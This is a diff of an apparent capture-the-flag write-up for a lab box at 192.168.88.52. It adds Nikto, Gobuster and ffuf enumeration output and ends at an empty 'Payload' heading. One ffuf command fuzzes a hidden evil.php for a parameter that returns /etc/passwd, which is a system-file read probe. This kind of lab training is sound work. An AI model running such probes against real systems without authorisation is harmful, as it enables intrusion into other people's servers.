@@ -1,6 +1,11 @@
 #  box writeup
 
 
+## Machine Configuration
+```
+IP:192.168.88.52
+```
+
 ## Credentials for debugging network connectivity
 ```
 
@@ -37,72 +42,124 @@ Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
 
 ```
 
+
+## Nikto
+```
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          192.168.88.52
++ Target Hostname:    192.168.88.52
++ Target Port:        80
++ Start Time:         2022-04-02 21:51:18 (GMT3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ Server leaks inodes via ETags, header found with file /, fields: 0x29cd 0x5c9a9bb4d712e 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2022-04-02 21:51:29 (GMT3) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+```
+
 ## Bruteforcing directories
 ```
-python3.7 dirsearch.py -u http://192.168.50.55/ -r
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.88.52
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/04/02 22:20:59 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 10701]
+/robots.txt           (Status: 200) [Size: 12]   
+/secret               (Status: 301) [Size: 315] [--> http://192.168.88.52/secret/]
+/server-status        (Status: 403) [Size: 278]                                   
+                                                                                  
+===============================================================
+2022/04/02 22:21:00 Finished
+===============================================================
 
-  _|. _ _  _  _  _ _|_    v0.4.2
- (_||| _) (/_(_|| (_| )
+```
 
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903
+## Fuzzing php files
+```
+ffuf -r -w /usr/share/dirb/wordlists/common.txt -u http://192.168.88.52/secret/FUZZ.php
 
-Output File: /media/xubzero/STUFF/mytools/dirsearch/reports/192.168.50.55/-_22-01-04_13-14-30.txt
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-Error Log: /media/xubzero/STUFF/mytools/dirsearch/logs/errors-22-01-04_13-14-30.log
+       v1.3.1-dev
+________________________________________________
 
-Target: http://192.168.50.55/
+ :: Method           : GET
+ :: URL              : http://192.168.88.52/secret/FUZZ.php
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
 
-[13:14:30] Starting: 
-[13:14:31] 403 -  278B  - /.ht_wsr.txt
-[13:14:31] 403 -  278B  - /.htaccess.orig
-[13:14:31] 403 -  278B  - /.htaccess.save
-[13:14:31] 403 -  278B  - /.htaccess_extra
-[13:14:31] 403 -  278B  - /.htaccessOLD
-[13:14:31] 403 -  278B  - /.htaccess.sample
-[13:14:31] 403 -  278B  - /.htaccessBAK
-[13:14:31] 403 -  278B  - /.htaccess_orig
-[13:14:31] 403 -  278B  - /.htaccess_sc
-[13:14:31] 403 -  278B  - /.htm
-[13:14:31] 403 -  278B  - /.html
-[13:14:31] 403 -  278B  - /.htpasswd_test
-[13:14:31] 403 -  278B  - /.htpasswds
-[13:14:31] 403 -  278B  - /.httr-oauth
-[13:14:32] 403 -  278B  - /.php
-[13:14:33] 403 -  278B  - /.htaccess.bak1
-[13:14:33] 403 -  278B  - /.htaccessOLD2
-[13:14:41] 200 -   10KB - /index.html
-[13:14:45] 200 -   12B  - /robots.txt
-[13:14:45] 200 -    4B  - /secret/     (Added to queue)
-[13:14:45] 301 -  315B  - /secret  ->  http://192.168.50.55/secret/
-[13:14:45] 403 -  278B  - /server-status
-[13:14:45] 403 -  278B  - /server-status/     (Added to queue)
-[13:14:49] Starting: secret/
-[13:14:50] 403 -  278B  - /secret/.ht_wsr.txt
-[13:14:50] 403 -  278B  - /secret/.htaccess.bak1
-[13:14:50] 403 -  278B  - /secret/.htaccess.sample
-[13:14:50] 403 -  278B  - /secret/.htaccess.orig
-[13:14:50] 403 -  278B  - /secret/.htaccess_extra
-[13:14:50] 403 -  278B  - /secret/.htaccess_orig
-[13:14:50] 403 -  278B  - /secret/.htaccess.save
-[13:14:50] 403 -  278B  - /secret/.htaccess_sc
-[13:14:50] 403 -  278B  - /secret/.htaccessBAK
-[13:14:50] 403 -  278B  - /secret/.htaccessOLD
-[13:14:50] 403 -  278B  - /secret/.htaccessOLD2
-[13:14:50] 403 -  278B  - /secret/.htm
-[13:14:50] 403 -  278B  - /secret/.html
-[13:14:50] 403 -  278B  - /secret/.htpasswds
-[13:14:50] 403 -  278B  - /secret/.htpasswd_test
-[13:14:50] 403 -  278B  - /secret/.httr-oauth
-[13:14:51] 403 -  278B  - /secret/.php
-[13:15:01] 200 -    4B  - /secret/index.html
-[13:15:07] Starting: server-status/
-[13:15:07] 404 -  275B  - /server-status/%2e%2e//google.com
+.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 241ms]
+.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]
+evil                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 663ms]
+                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 706ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+
+
+ffuf -c -r -w ~/wordlists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.88.52/secret/evil.php/?FUZZ=/etc/passwd -fs 0 | tee /tmp/log
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.88.52/secret/evil.php/?FUZZ=/etc/passwd
+ :: Wordlist         : FUZZ: /home/xubzero/wordlists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 0
+________________________________________________
+
+command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 5ms]
+:: Progress: [2588/2588] :: Job [1/1] :: 498 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+
+
 
 
 
 ```
-
-
 
 
 ## Payload
